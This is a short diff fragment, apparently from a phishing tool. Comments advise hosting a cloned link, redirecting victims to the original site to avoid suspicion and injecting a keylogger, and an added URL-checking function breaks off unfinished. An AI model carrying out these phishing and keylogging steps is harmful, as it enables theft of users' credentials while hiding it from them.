@@ -41,3 +41,13 @@ if func == "1":
 #host the link on your system
 #redirect to the original site after getting info to avoid suspicion
 #inject keylogger while you're at it
+
+
+
+
+
+#checking link:
+def check_url(url):
+    filename = url.split("//")[1].split(".")[0] + "check"
+    with open(f'{filename}.html', 'wb') as the_file:
+    
